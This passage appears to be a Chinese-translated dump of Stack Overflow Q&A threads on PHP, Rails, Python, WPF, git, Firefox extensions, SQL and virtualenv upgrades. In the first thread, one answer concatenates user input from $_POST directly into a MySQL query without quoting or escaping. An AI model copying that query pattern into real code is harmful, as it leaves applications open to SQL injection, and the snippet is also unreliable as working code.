我想创建一个简单的表单来显示数据库中的数据项，并且我创建了一个相应的复选框列，但是问题是我想访问与选中的复选框相对应的数据项，我希望有人能提供帮助，这是我的代码：

```
<form action="" method="post">
        <p>
            <?php
        $con = mysql_connect('localhost', 'root', "");
        if (!$con) {
            die ('connection error');
        }
        else {
            mysql_select_db("db_name", $con);
            $result = mysql_query ('SELECT `name` FROM `fruit`');

                 echo '<table width="100%">
                <tr>
                    <td><b>Name</b></td>
                    <td><b>choose</b></td>
                </tr>';
        while($row = mysql_fetch_assoc($result)) {
            echo "
                <tr>
                    <td>{$row['name']}</td>
                    <td><input type='checkbox' name='fruit' /><br /></td></tr>";
            }
        }
        if(isset($_POST['fruit'])) {
            echo $row['name'];
        }
        ?>
        </p>
        <p><input type="submit" value="save & send invitations" /></p>
   </form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:38:16.830

如果我理解正确，您只需要替换它：

```
if(isset($_POST['fruit'])) {
        echo $row['name'];
    } 
```

有类似的东西：

```
if(isset($_POST['fruit'])) {
  $result = mysql_query ('SELECT `name` FROM `fruit` WHERE `name`='.$_POST['fruit']);
  while($row = mysql_fetch_assoc($result)) {
        echo $row['name'];
  }
} 
```

# node.js - ExpressJS 从视图中获取结果源而不是渲染它

> ID：10218910
> 
> 赞同：0
> 
> 时间：2012-04-18T22:19:01.497
> 
> 标签：node.js, express, railway.js

我打算使用一些 ejs 模板来生成用于发送电子邮件的 HTML。

我想将模型传递给我的视图，并取回生成的 HTML 所以，我想在将 html 传递回浏览器之前将其“获取”到变量中，而不是 render()？

那可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T03:42:04.757

像下面这样的东西会起作用：

```
var ejs = require('ejs');
var str = ejs.render("<title><%= title %></title>", {title: 'Hello'});
console.log(str); 
```

# ruby - Rails - 如何处理不存在的路线（“没有路线匹配[GET]”）？

> ID：10218912
> 
> 赞同：4
> 
> 时间：2012-04-18T22:19:22.753
> 
> 标签：ruby, ruby-on-rails-3, routes

我的`route`样子

```
match 'about' => 'company#about' 
```

当我设置为 url`http://localhost:3000/aboutttt`时，我收到错误消息

```
No route matches [GET] "/aboutttt" 
```

我想给用户比这更好的反馈。

我认为最好的解决方案可能是将应用程序重定向回来，或者在应用程序的主页上，但是当我收到上述错误时，路由中存在任何设置默认路由的方式？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2015-02-16T06:25:45.763

在您进行开发时。通过设置在 config/environments/development.rb 中进行更改： `config.consider_all_requests_local = false`

这将禁用完整的错误报告，而是显示一个为用户提供交互式响应的页面。但这已经在生产环境中被禁用。但我不建议在开发模式下关闭它。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-18T22:36:50.423

在将环境设置为生产环境的情况下运行您的应用程序，我想您会发现您将不再看到此消息。在您开发时进行调试很方便。

`config/environments/production.rb`or中有一个设置`config/environments/development.rb`（我不记得是哪种方式），它控制是否将异常呈现为视图。这对生产来说是关闭的——相反，你会得到 404.html 中的`public`内容，你可以随意更改它。

# python - 在python中排序

> ID：10218917
> 
> 赞同：0
> 
> 时间：2012-04-18T22:19:54.297
> 
> 标签：python

我正在尝试学习 python 并擅长算法。这是我的第一语言。

例如：取“baggage”并分类为“aabeggg”

```
string = "baggage"
count = [0] * len(string)

for x in string:
    num_value = ord(x)
    count[num_value] += 1 
```

我认为以上是一个开始......但我真的不知道如何去做。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T22:57:41.723

`collections.Counter`是解决这个问题的好方法，但这里有一种方法可以让你朝着你前进的方向走得更远

```
string = "baggage"
count = [0] * 256  # This should be big enough to hold counters for every 8 bit character

for x in string:
    num_value = ord(x)
    count[num_value] += 1

for i in range(256):  # loop through all the possible 8 numbers
    if count[i]: 
        print chr(i)*count[i]

# you can join them all back into a string like this
newstr = ''.join(chr(i)*c for i,c in enumerate(count)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:26:46.057

让我们在这里看看你的代码。

```
string = "baggage"
count = [0] * len(string)
# count is now [0,0,0,0,0,0,0]

for x in string:
    num_value = ord(x)
    # ord(x) gives you the ascii number value of a character x
    # So for example ord('b') = 98
    count[num_value] += 1
    # error here since count[98] isn't set. 
```

巴勃罗给了你一个快速的解决方案。我将使用可能更明确的字典写出一个。

```
string = "baggage"
count = {}

for c in string:
    if c in count:
        count[c] += 1
    else:
        count[c] = 1

print ''.join(count[c]*c for c in sorted(count)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T22:43:21.123

使用`collections.Counter`：

```
from collections import Counter
string = 'baggage'
c = Counter(string)
result = ''.join(c[x]*x for x in sorted(c.keys())) 
```

它的工作原理如下：

*   `Counter`完全符合您的目标`count[num_value] += 1`
*   `sorted(c.keys())`按排序顺序为您提供字符
*   `c[x]*x``c[x]`是由char 的副本组成的字符串`x`
*   `''.join( ... )`将每个结果字符串连接成一个字符串

# wpf - 将 RichTextBox 的选定文本绑定到 ViewModel 中的属性

> ID：10218921
> 
> 赞同：0
> 
> 时间：2012-04-18T22:20:14.567
> 
> 标签：wpf, data-binding, wpf-controls, richtextbox, flowdocument

嗨，我正在使用 WPF 并使用 MVVM 模式。所以我的问题是我试图将 RichTextBox 的选定文本绑定到我的 ViewModel 中的一个属性，但我无法绑定 Selection 属性。

那么我该怎么做呢？

将 RichTextBox 的 Selection 属性绑定到我的 ViewModel 中的属性是我认为更好地将效果和装饰应用于文本的方式。

如果有人知道在 ViewModel 中了解 RichTextBox 的选定文本的更好方法，请告诉我。我开始学习 FlowDocuments 并使用 RichTextBox，所以这就是为什么我有点迷失了。

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T23:23:33.063

您可以使用[`Behavior`](http://msdn.microsoft.com/en-us/library/ff726531%28v=expression.40%29.aspx)：

```
public class RichTextSelectionBehavior : Behavior<RichTextBox>
{
    protected override void OnAttached()
    {
        base.OnAttached();
        AssociatedObject.SelectionChanged += RichTextBoxSelectionChanged;
    }

    protected override void OnDetaching()
    {
        base.OnDetaching();
        AssociatedObject.SelectionChanged -= RichTextBoxSelectionChanged;
    }

    void RichTextBoxSelectionChanged(object sender, System.Windows.RoutedEventArgs e)
    {
        SelectedText = AssociatedObject.Selection.Text;
    }

    public string SelectedText
    {
        get { return (string)GetValue(SelectedTextProperty); }
        set { SetValue(SelectedTextProperty, value); }
    }

    public static readonly DependencyProperty SelectedTextProperty =
        DependencyProperty.Register(
            "SelectedText",
            typeof(string),
            typeof(RichTextSelectionBehavior),
            new FrameworkPropertyMetadata(null, FrameworkPropertyMetadataOptions.BindsTwoWayByDefault, OnSelectedTextChanged));

    private static void OnSelectedTextChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
        var behavior = d as RichTextSelectionBehavior;
        if (behavior == null)
            return;
        behavior.AssociatedObject.Selection.Text = behavior.SelectedText;
    }
} 
```

XAML 用法：

```
 <RichTextBox>
        <i:Interaction.Behaviors>
            <local:RichTextSelectionBehavior SelectedText="{Binding SelectedText}" />
        </i:Interaction.Behaviors>
    </RichTextBox> 
```

（`SelectedText`ViewModel 上的字符串属性在哪里）

# xml - git rerere 如何找出两个冲突之间的相似之处？

> ID：10218922
> 
> 赞同：5
> 
> 时间：2012-04-18T22:20:17.293
> 
> 标签：xml, git, merge, conflict, git-rerere

好的，这是我的问题。“git rerere”是否比较两个文件的哈希值以找出分辨率？也就是说，假设我有一个包含此标记的 XML 文件：

```
<number>12</number> 
```

当我遇到冲突时，该数字通常会更改为 13、14 等，所以我坚持：

```
<<<<<<<
<number>12</number>
=======
<number>13</number>
>>>>>>> 
```

即使数字与上次不同，rerere 是否可以自动解决此冲突？我总是希望它以采用更高数字的方式解决它（在上面的示例中，13）。那么如果它记录了数字 12 和 13 的分辨率，它会解决与不同数字的冲突吗？我怀疑它不会，但不妨问问。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-21T18:19:00.590

> 即使数字与上次不同，rerere 是否可以自动解决此冲突？我总是希望它以采用更高数字的方式解决它（在上面的示例中，13）。

不，`git rerere`不能那样做。

当你使用 时`git rerere`，你要求它记住两件事：

*   一个特定的冲突（即，有冲突的大块头的文字文本和它们所在的文件）；和
*   应该适用于该冲突的解决方案

因为这些是大块*文字*（例如“用 13 替换 12”）而不是某种转换函数（例如“用 N + 1 替换 N”），所以 git 无法推断您想要用更高的数字替换每个数字。

如果 git 稍后遇到与其先前记住的任何冲突都不匹配的冲突，就好像它根本没有遇到过该冲突，即使它可能是相似的（如在您的示例中，数字始终为一个）。

如果此 XML 文件是自动生成的，则可能有一种方法。在这种情况下，您可能需要考虑根本不将其保留在源代码管理中，而是在运行时生成它。那么你将永远不会有相应的冲突需要清理。

另一种方法是完全避免`git rerere`，而是编写一个自定义合并驱动程序来为您解决问题。我以前做过这个，但这是一项非常重要的工作，它需要你编写和测试一些代码。如果您对此策略感兴趣，请参阅[Karl 的回答](https://stackoverflow.com/a/10263433/75170)中[的链接](http://linux.die.net/man/5/gitattributes)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-21T22:05:26.320

Vanilla git 不会那样比较文件。它进行严格的字符串比较，并且对它的语义一无所知。

[但是，请查看gitattributes 手册页](http://linux.die.net/man/5/gitattributes)中的“定义自定义合并驱动程序” 。它允许您编写自己的程序以任何您想要的方式解决某些合并，包括选择更高的数字。

# php - PHP 使用哪种正则表达式算法？

> ID：10218925
> 
> 赞同：9
> 
> 时间：2012-04-18T22:20:22.727
> 
> 标签：php, regex, algorithm, pcre

[根据这篇文章](http://swtch.com/~rsc/regexp/regexp1.html)，在阅读了有关两种不同类型的正则表达式算法（Perl 5.8.7 和 Thompson NFA）的文章后，后者比前者快了约 1,000,000 倍。我每天都使用 PHP，并且经常使用正则表达式，所以我想知道 PHP 使用哪种算法。

我发现[了这个问题](https://stackoverflow.com/questions/727565/which-regular-expression-algorithm-does-javascript-use-for-regex)，但它仅适用于 JavaScript。其中一个答案指出 JavaScript 使用 Thompson NFA 算法，但这当然会因实现而异。我认为当 PHP 转移到它的`PCRE`一组函数时，它可能已经切换到使用更快的算法，弃用了`ereg_*`这些东西。

我查看了[PHP PCRE 文档](http://www.php.net/manual/en/book.pcre.php)，据我所知，它没有告诉我它使用什么算法。对我来说，首字母缩写词`PCRE`告诉我它使用`Perl Compatible Regular Expressions`，所以我假设它使用 Perl 风格的算法。

PHP 使用哪种正则表达式算法？是“Perl 5.8.7 风格”，还是使用更快的 Thompson NFA 算法，还是完全使用另一种？它甚至可以使用 Perl 后端来运行它的表达式吗？

如果 PHP*确实*使用 Perl 风格的算法，它到底是什么？我正在寻找与其他算法相关的抽象定义/解释。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-18T23:36:15.257

From the manual:

[http://www.php.net/pcre](http://www.php.net/pcre):

> Regular Expressions (**Perl-Compatible**)

[http://www.php.net/manual/en/intro.pcre.php](http://www.php.net/manual/en/intro.pcre.php):

> The PCRE library is a set of functions that implement regular expression pattern matching using the same syntax and semantics as Perl 5, with just a few differences (see below). The current implementation corresponds to Perl 5.005.

# javascript - Firefox 扩展：在加载之前访问 DOM

> ID：10218934
> 
> 赞同：2
> 
> 时间：2012-04-18T22:20:51.740
> 
> 标签：javascript, firefox, dom, firefox-addon

我正在尝试创建一个 Firefox 扩展，在触发当前页面的任何 Javascript 之前触发我的 Javascript 代码。我的 Javascript 代码将基本上控制页面的 Javascript 代码是否可以执行或拒绝。

我首先尝试遵循[这个答案](https://stackoverflow.com/q/5205672/1253609)，但我无法真正弄清楚如何让它工作并意识到我正在依赖`onDOMContentLoaded`，它在 Javascript 已经执行后加载。

然后我把注意力转向 XPCOM，但又一次没有真正理解 Firefox 教程告诉我的内容。

我最近一直在尝试[通过 Firebug 进行扩展](http://www.softwareishard.com/blog/firebug-tutorial/extending-firebug-hello-world-part-i/)，但我似乎遇到了同样的问题......只有在 Javascript 被解析/执行后才能访问它。这是我编写的[结果代码](http://pastebin.com/RrzGGuFA)。我想如果我可以在`onExamineResponse`事件中访问文件的对象，我的问题就可以解决，但我不知道该怎么做......我说的是这段代码：

```
BeepbopListener.prototype = {
    onRequest: function(context, file) {
       ...
    },

    onExamineResponse: function(context, file) {
        FBTrace.sysout("onexamineresponse " + file);  // this returns something like
        // '[xpconnect wrapped (nsISupports, nsIHttpChannel, nsIRequest, nsIUploadChannel, nsITraceableChannel, nsIHttpChannelInternal)]'
        // but I don't know how to access those elements...
        var pattern = /\.js$/;
        if (pattern.test(file.href) && FBTrace.DBG_BEEPBOP) {
          FBTrace.sysout("ONEXAMINE DOESN'T EVEN GET IN THIS IF SO YOU WON'T SEE THIS");
        }
    },

    ...
}; 
```

所以我的问题是......是否有一个教程向我展示了如何在页面执行之前访问页面上的所有 Javascript 代码？另外，如果有人有任何有用的见解，我很想听听。哦，如果你们都需要我提供更多代码，请告诉我，我会发布它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T07:19:29.437

通过收听[`content-document-global-created`观察者通知](https://developer.mozilla.org/en/Observer_Notifications#Documents)，您可以在任何 JavaScript 代码运行之前访问新文档。但是，此时文档将为空，并且 JavaScript 代码将在解析器添加`<script>`标签后立即运行 - 您无法真正阻止它。以下是我知道的控制脚本执行的选项。

1) 使用以下命令禁用窗口的所有 JavaScript [`nsIDocShell.allowJavascript`](https://developer.mozilla.org/en/XPCOM_Interface_Reference/nsIDocShell#Attributes)：

```
wnd.QueryInterface(Components.interfaces.nsIInterfaceRequestor)
   .getInterface(Components.interfaces.nsIWebNavigation)
   .QueryInterface(Components.interfaces.nsIDocShell)
   .allowJavascript = false; 
```

这是一种全有或全无的方法。请注意，即使新文档加载到同一框架中，JavaScript 也会保持禁用状态。

2）在一个XPCOM组件中实现[`nsIContentPolicy`接口](https://developer.mozilla.org/en/XPCOM_Interface_Reference/nsIContentPolicy)，并在`content-policy`类别中注册（通过[`nsICategoryManager`](https://developer.mozilla.org/en/XPCOM_Interface_Reference/nsICategoryManager)）。您的`shouldLoad()`函数将能够有选择地阻止脚本 - 但它只会调用外部脚本（意思是`<script src="...">`），而不是页面上的内联脚本。

3) 使用[JavaScript 调试器服务](http://mxr.mozilla.org/mozilla/source/js/jsd/idl/jsdIDebuggerService.idl)拦截脚本执行。您可以使用`jsdIDebuggerService.interruptHook`单步执行 JavaScript 并随时中止脚本。但这当然会大大减慢 JavaScript 的执行速度。至少你应该用`jsdIDebuggerService.addFilter()`它来限制它到一个特定的文档，否则你会减慢整个浏览器（包括浏览器 UI）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-03-19T04:47:07.577

> 我正在尝试创建一个 Firefox 扩展，在触发当前页面的任何 Javascript 之前触发我的 Javascript 代码。我的 Javascript 代码将基本上控制页面的 Javascript 代码是否可以执行或拒绝。

首先完全防止文档被完全解析，然后在一边，获取相同的文档，对此文档进行任何处理，然后将生成的文档注入页面中。这是我目前的做法[https://stackoverflow.com/a/36097573/6085033](https://stackoverflow.com/a/36097573/6085033)

# java - 通过 Socket 将复杂对象从 Java 客户端发送到 C 服务器

> ID：10218935
> 
> 赞同：0
> 
> 时间：2012-04-18T22:20:55.363
> 
> 标签：java, c, sockets, tcp

我想通过 TCP Socket 将一些复杂的对象从 Java 客户端发送到 C 服务器。

我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T23:28:28.540

从根本上讲，问题是“*如何以与语言无关的方式序列化/反序列化对象？* ”在您的情况下特别是 Java 和 C。由于您将通过网络发送此数据，因此处理[网络顺序/字节顺序](http://en.wikipedia.org/wiki/Endianness)问题也很重要。

我假设您可以访问客户端和服务器。这意味着您可以选择如何序列化数据。（如果不是，答案很简单。写下对方期望的规格）

就个人而言，我会使用[Protocol Buffers](http://code.google.com/p/protobuf/)。有[Java 绑定](https://developers.google.com/protocol-buffers/docs/reference/java-generated) 和[C 绑定](http://code.google.com/p/protobuf-c/)。

如果您不喜欢 Protocol Buffers，还有其他选项，例如：

*   [JSON](http://en.wikipedia.org/wiki/JSON)（已经提到过）
*   [YAML](http://yaml.org/)
*   阿帕奇[节俭](http://thrift.apache.org/)
*   [XDR](https://www.rfc-editor.org/rfc/rfc4506)
*   自己动手
*   ...

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T22:38:29.393

将 Java 对象的字段写入字符串（可能是[JSON](http://en.wikipedia.org/wiki/JSON)），通过 TCP 发送它们，然后让 C 程序读取字符串并使用它在另一端初始化新的 C 变量。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-09-01T13:29:03.307

这个问题已经很老了，但万一有人还在寻找一个好的解决方案，你可以尝试协议缓冲区的实现，正如@Adam Liss 之前的回答中提到的那样：（developers.google.com/protocol-buffers /)

简而言之，您可以像在协议实现中那样定义任何复杂的消息类型，并且该工具会生成可以序列化和反序列化它的 C++/Java/Python 代码。

出于使用 C 代码的相同目的，德国慕尼黑工业大学 (TUM) 的一个研究项目创建了一个标准 C 代码生成器，可用于嵌入式 C 项目。这与 Google 的 protobuf 实现完全兼容（由于 C 结构的限制）。这比[C 绑定](https://code.google.com/p/protobuf-c/)更好，因为它不需要链接任何库。我在让[C 绑定](https://code.google.com/p/protobuf-c/)在我正在使用的嵌入式系统上工作时遇到了问题，因为它需要与支持库链接。

这为我的嵌入式项目节省了（痛苦的）一天——在嵌入式系统和 Android 应用程序（Java）/桌面应用程序（C++/Qt）之间传递复杂的网络数据（请求-响应）。

# asp.net - 在 Sql 中将时间格式从 00:00:00 更改为秒

> ID：10218938
> 
> 赞同：1
> 
> 时间：2012-04-18T22:21:05.060
> 
> 标签：asp.net, sql, sql-server, webforms

在我的 ASP.Net 应用程序中，我有一个 Sql 数据库。表中的一列称为 productDelivered，它使用数据类型 time(7)；但是，我想将时间转换为秒并保留它。我有大约 50-60 条记录。

有没有办法将这些时间更改为秒？我不介意在表中为 productDeliveredSeconds 创建一个新列，但我认为存储过程或视图可能会做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-16T09:15:02.953

您可以将[计算列](http://msdn.microsoft.com/en-us/library/ms186241.aspx)添加到使用[datediff](http://msdn.microsoft.com/en-us/library/ms189794.aspx)计算秒数的表中。

```
alter table YourTable add productDeliveredSeconds as datediff(second, 0, productDelivered) 
```

或者您可以`datediff`在查询中使用。

```
select datediff(second, 0, productDelivered) as productDeliveredSeconds 
from YourTable 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:23:44.260

`TIME_TO_SEC(time)`返回时间参数，转换为秒。

```
mysql> SELECT TIME_TO_SEC('22:23:00');
        -> 80580
mysql> SELECT TIME_TO_SEC('00:39:38');
        -> 2378 
```

# javascript - 使用稍后确定的参数调用 JavaScript 函数

> ID：10218939
> 
> 赞同：0
> 
> 时间：2012-04-18T22:21:06.090
> 
> 标签：javascript

我想存储一个指向函数的指针，然后稍后用一些参数调用它，但是我在如何将参数传递给函数时遇到了麻烦。

例如：

```
var MyObject = (function () {
    return {
        myMethod: function (a, b) {
            return a + b;
        }
    };
}());

var method = MyObject.myMethod;
var args = [2, 5];

method(args); 
```

所以在最后一行，我知道它没有做我想要`method(args)`的，我想基本上调用`MyObject.myMethod(2, 5)`，所以我的数组尝试失败并且创建一个对象也失败了。如何将存储的参数传递给存储的方法？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-18T22:23:21.893

您可以使用[`apply`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/apply)which 接受参数数组作为参数

```
var myarray = [2,5,...] //your array of arguments

method.apply(this,myarray);  //execute your method 
```

并且在您拥有的方法中，您可以通过“隐藏”“伪数组”参数接收`arguments`参数。

```
function method(){
   var args = arguments; //is [2,5,...]
} 
```

这有优势，[`call`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/call)因为您可以预先构建参数数组，而不必枚举调用中的参数`()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:23:48.847

K. Scott Allen 有一篇关于这类事情的很棒的旧文章。使用`call`or`apply`作为一种方式来影响被`this`调用函数内部的值。

[http://odetocode.com/blogs/scott/archive/2007/07/05/function-apply-and-function-call-in-javascript.aspx](http://odetocode.com/blogs/scott/archive/2007/07/05/function-apply-and-function-call-in-javascript.aspx)

# python - 使用 python 将 .dbf 保存为 .xls

> ID：10218944
> 
> 赞同：0
> 
> 时间：2012-04-18T22:21:31.927
> 
> 标签：python, save

有没有一种简单的方法可以使用 python 将 .dbf 文件保存为 .xls 文件。我只想在 python 中打开 .dbf 文件，然后立即执行“另存为 .xls”。我试图避免遍历 dbf 中的记录并写入 excel 表。

就像是：

```
fileobj = open(outFolder + "\\" + "TABLE.dbf")
fileobj.save(outFolder + "\\" + "TABLE.xls") 
```

我在互联网上搜索过，但没有找到任何东西，所以我想我会尝试一个帖子。

谢谢，迈克

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T23:37:27.477

If you were willing to accept using the Python `csv` module (which would involve looping through dbf records and writing csv), consider going straight to `xls` by using [xlwt](http://pypi.python.org/pypi/xlwt).

Alternatively, could your client could be shown how to open dbf files in Excel?

# php - 禁用已弃用的错误

> ID：10218945
> 
> 赞同：0
> 
> 时间：2012-04-18T22:21:42.583
> 
> 标签：php

我想全局启用已弃用的错误，但为特定的第三方代码禁用它们，我没有时间修复。所以，我在 php.ini 中有这个： `error_reporting = E_ALL & ~E_NOTICE | E_DEPRECATED`

这在我要禁用警告的行之前 `error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED);`

但是，它不起作用，我仍然收到该特定行的警告。如果我在 php.ini 中全局禁用它们，它就可以工作。我正在使用 PHP 5.3.10。有什么想法可能是错的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T23:06:56.367

弄清楚了。第三方代码具有自定义错误处理程序，显然它覆盖了您使用 error_reporting() 设置的任何内容。当我注释掉 set_error_handler() 行时，error_reporting() 生效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-30T10:13:09.977

在 php.ini 中添加以下错误报告行：

```
error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE & ~E_DEPRECATED); 
```

然后重新启动服务器并检查它。

# python - 在 virtualenv 中升级 python

> ID：10218946
> 
> 赞同：259
> 
> 时间：2012-04-18T22:21:43.537
> 
> 标签：python, pip, virtualenv, version, requirements

有没有办法升级 virtualenv 中使用的 python 版本（例如，如果出现错误修复版本）？

我可以`pip freeze --local > requirements.txt`，然后删除目录 and `pip install -r requirements.txt`，但这需要大量重新安装大型库，例如，`numpy`我经常使用的。

从例如 2.6 -> 2.7 升级时，我可以看到这是一个优势，但是 2.7.x -> 2.7.y 呢？

* * *

## 回答 #1

> 赞同：130
> 
> 时间：2017-02-23T01:48:39.427

如果您碰巧使用的是 Python 3.3+ 附带的 venv 模块，它支持一个`--upgrade`选项。根据[文档](https://docs.python.org/3/library/venv.html)：

> 升级环境目录以使用此版本的 Python，假设 Python 已就地升级

```
python3 -m venv --upgrade ENV_DIR 
```

* * *

## 回答 #2

> 赞同：90
> 
> 时间：2012-06-16T02:11:04.530

你看到[这个了](https://stackoverflow.com/questions/2170252/can-existing-virtualenv-be-upgraded-gracefully)吗？如果我没有误解那个答案，您可以尝试在旧的虚拟环境之上创建一个新的虚拟环境。您只需要知道哪个 python 将使用您的 virtualenv（您需要查看您的 virtualenv 版本）。

如果您的 virtualenv 安装了与旧版本相同的 python 版本并且升级您的 virtualenv 包不是一种选择，您可能需要阅读[此](https://stackoverflow.com/questions/1534210/use-different-python-version-with-virtualenv)内容以便安装具有您想要的 python 版本的 virtualenv。

**编辑**

我已经测试了这种方法（在旧方法之上创建新的 virtualenv 的方法），它对我来说效果很好。我认为如果您从 python 2.6 更改为 2.7 或 2.7 更改为 3.x，您可能会遇到一些问题，但是如果您只是在同一版本内升级（根据需要保持在 2.7），您应该没有任何问题，因为所有的包对于两个 python 版本都保存在相同的文件夹中（2.7.x 和 2.7.y 包在 your_env/lib/python2.7/ 中）。

如果您更改您的 virtualenv python 版本，您将需要为该版本再次安装所有软件包（或者只需将您需要的软件包链接到新版本的软件包文件夹中，即：your_env/lib/python_newversion/site-packages）

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2014-07-13T15:36:51.467

***再次更新：*** 以下方法可能不适用于较新版本的 virtualenv。在尝试对旧的 virtualenv 进行修改之前，您应该将依赖项保存在需求文件 (`pip freeze > requirements.txt`) 中并在其他地方进行备份。如果出现任何问题，您仍然可以创建一个新的 virtualenv 并在其中安装旧的依赖项（`pip install -r requirements.txt`）。

***更新：***我在最初回答 5 个月后更改了答案。下面的方法更方便、更健壮。

***副作用：***它还修复了将 Python 升级到 v2.7.8 后在虚拟环境中`Symbol not found: _SSLv2_method`执行的异常`import ssl`

***注意：***目前，**这仅适用于 Python** 2.7.x。

* * *

如果你在 OS X 上使用 Homebrew Python，首先`deactivate`是 virtualenv，然后升级 Python：

```
brew update && brew upgrade python 
```

运行以下命令（`<EXISTING_ENV_PATH>`是您的虚拟环境的路径）：

```
cd <EXISTING_ENV_PATH>
rm .Python
rm bin/pip{,2,2.7}
rm bin/python{,2,2.7}
rm -r include/python2.7
rm lib/python2.7/*
rm -r lib/python2.7/distutils
rm lib/python2.7/site-packages/easy_install.*
rm -r lib/python2.7/site-packages/pip
rm -r lib/python2.7/site-packages/pip-*.dist-info
rm -r lib/python2.7/site-packages/setuptools
rm -r lib/python2.7/site-packages/setuptools-*.dist-info 
```

最后，重新创建您的虚拟环境：

```
virtualenv <EXISTING_ENV_PATH> 
```

通过这样做，旧的 Python 核心文件和标准库（加号`setuptools`和 二进制库可能需要也可能不需要重新安装才能正常运行。`pip``site-packages`

这在 5 个安装了 Django 的虚拟环境中对我有用。

顺便说一句，如果`./manage.py compilemessages`之后不工作，试试这个：

```
brew install gettext && brew link gettext --force 
```

* * *

## 回答 #4

> 赞同：17
> 
> 时间：2020-03-15T07:41:45.027

**第 1 步：**冻结需求并备份现有环境

```
pip freeze > requirements.txt
deactivate
mv env env_old 
```

**第 2 步：**安装 Python 3.7 并激活虚拟环境

```
sudo apt-get install python3.7-venv
python3.7 -m venv env
source env/bin/activate
python --version 
```

**第 3 步：**安装要求

```
sudo apt-get install python3.7-dev
pip3 install -r requirements.txt 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2017-06-10T19:50:05.677

# 如何为现有的 virtualenvwrapper 项目升级 Python 版本并保持相同的名称

我正在为任何使用 Doug Hellmann 出色的[virtualenvwrapper](https://virtualenvwrapper.readthedocs.io/en/latest/)的人添加一个答案，因为现有的答案对我没有帮助。

一些上下文：

*   我从事一些 Python 2 项目和一些 Python 3 项目。虽然我很想使用`python3 -m venv`，但它不支持 Python 2 环境
*   当我开始一个新项目时，我使用`mkproject`which 创建虚拟环境，创建一个空的项目目录，然后 cds 进入它
*   我想继续使用 virtualenvwrapper 的`workon`命令来激活任何项目，无论 Python 版本如何

方向：

假设您现有的项目已命名`foo`并且当前正在运行 Python 2 ( `mkproject -p python2 foo`)，尽管无论从 2.x 升级到 3.x、从 3.6.0 升级到 3.6.1 等命令都是相同的。我也假设你当前在激活的虚拟环境中。

1\. 停用并移除旧的虚拟环境：

```
$ deactivate
$ rmvirtualenv foo 
```

请注意，如果您已将任何自定义命令添加到挂钩（例如，`bin/postactivate`），则需要在删除环境之前保存这些命令。

2\. 将真实项目存放在临时目录中：

```
$ cd ..
$ mv foo foo-tmp 
```

3\. 创建新的虚拟环境（和项目目录）并激活：

```
$ mkproject -p python3 foo 
```

4.将生成的空项目目录替换为真实项目，改回项目目录：

```
$ cd ..
$ mv -f foo-tmp foo
$ cdproject 
```

5.重新安装依赖，确认新的Python版本等：

```
$ pip install -r requirements.txt
$ python --version 
```

如果这是一个常见的用例，我会考虑打开一个 PR 以将`$ upgradevirtualenv`/之类的内容添加`$ upgradeproject`到 virtualenvwrapper。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2014-10-21T11:22:37.937

我无法在旧虚拟环境之上创建新的虚拟环境。但是 pip 中有一些工具可以更快地将需求重新安装到全新的 venv 中。Pip 可以将您的 requirements.txt 中的每个项目构建到一个轮子包中，并将其存储在本地缓存中。当您创建一个新的 venv 并在其中运行 pip install 时，如果 pip 找到它们，它将自动使用预构建的轮子。Wheels 的安装速度比为每个模块运行 setup.py 快得多。

我的 ~/.pip/pip.conf 看起来像这样：

```
[global]
download-cache = /Users/me/.pip/download-cache
find-links =
/Users/me/.pip/wheels/

[wheel]
wheel-dir = /Users/me/.pip/wheels 
```

我安装轮子（`pip install wheel`），然后运行`pip wheel -r requirements.txt`。这会将构建的轮子存储在我的 pip.conf 中的 wheel-dir 中。

从那时起，每当我 pip install 任何这些要求时，它都会从轮子上安装它们，这非常快。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2019-10-02T18:36:20.590

这种方法总是对我有用：

```
# First of all, delete all broken links. Replace  my_project_name` to your virtual env name
find ~/.virtualenvs/my_project_name/ -type l -delete
# Then create new links to the current Python version
virtualenv ~/.virtualenvs/my_project_name/
# It's it. Just repeat for each virtualenv located in ~/.virtualenvs 
```

摘自：

*   [https://github.com/1st/python-on-osx#python-virtualenv](https://github.com/1st/python-on-osx#python-virtualenv)
*   [https://gist.github.com/1st/ced02a1c64ac7b82bb27e432eea6b068](https://gist.github.com/1st/ced02a1c64ac7b82bb27e432eea6b068)

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2020-11-16T17:49:19.023

让我们考虑一个想要更新的环境有名称`venv`。

**1.备份venv要求**（可选）

首先，备份虚拟环境的要求：

```
pip freeze > requirements.txt
deactivate
#Move the folder to a new one
mv venv venv_old 
```

